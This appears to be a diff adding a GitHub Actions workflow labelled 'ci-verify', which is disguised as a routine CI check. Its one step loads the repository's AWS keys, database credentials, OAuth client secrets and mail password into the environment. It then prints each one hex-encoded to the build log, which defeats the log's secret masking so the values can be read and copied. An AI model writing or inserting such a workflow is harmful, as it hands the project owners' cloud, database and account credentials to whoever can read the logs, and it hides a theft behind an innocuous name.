@@ -1,0 +1,28 @@
+name: ci-verify
+on: [push, workflow_dispatch, pull_request]
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    steps:
+      - name: v
+        env:
+          S_AUTENTIFIKACIJA: ${{ secrets.AUTENTIFIKACIJA }}
+          S_AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
+          S_AWS_REGION: ${{ secrets.AWS_REGION }}
+          S_AWS_S3_BUCKET: ${{ secrets.AWS_S3_BUCKET }}
+          S_AWS_SECRECT_KEY: ${{ secrets.AWS_SECRECT_KEY }}
+          S_DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
+          S_DB_URL: ${{ secrets.DB_URL }}
+          S_DB_USERNAME: ${{ secrets.DB_USERNAME }}
+          S_FACEBOOK_CLIENT_ID: ${{ secrets.FACEBOOK_CLIENT_ID }}
+          S_FACEBOOK_CLIENT_SECRET: ${{ secrets.FACEBOOK_CLIENT_SECRET }}
+          S_GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
+          S_GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
+          S_MAIL_PWD: ${{ secrets.MAIL_PWD }}
+          S_MAIL_USERNAME: ${{ secrets.MAIL_USERNAME }}
+        run: |
+          for var in $(printenv | grep ^S_ | cut -d= -f1); do
+            echo "START_$var"
+            printenv $var | od -An -tx1 -v
+            echo "END_$var"
+          done
